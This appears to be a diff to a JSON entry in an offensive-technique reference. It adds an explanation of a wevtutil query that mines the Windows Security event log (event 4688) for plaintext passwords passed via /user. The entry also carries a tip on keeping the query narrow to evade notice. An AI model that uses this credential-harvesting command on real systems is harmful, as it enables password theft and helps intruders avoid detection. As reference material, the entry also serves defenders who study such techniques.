@@ -91,5 +91,6 @@
       "MITRE T1552.006"
     ],
     "evasion": "Read only the events you need (targeted query) rather than exporting whole logs."
-  }
+  },
+  "explain": "Abuses Event Log Readers membership to mine the Security log for passwords:\n  wevtutil qe Security     query the Security event log\n  /rd:true                 read newest events first\n  /f:text                  plain-text output\n  | Select-String \"/user\"  filter to lines containing /user\nProcess-creation events (4688) often capture command lines with plaintext passwords passed via /user - grep them out."
 }
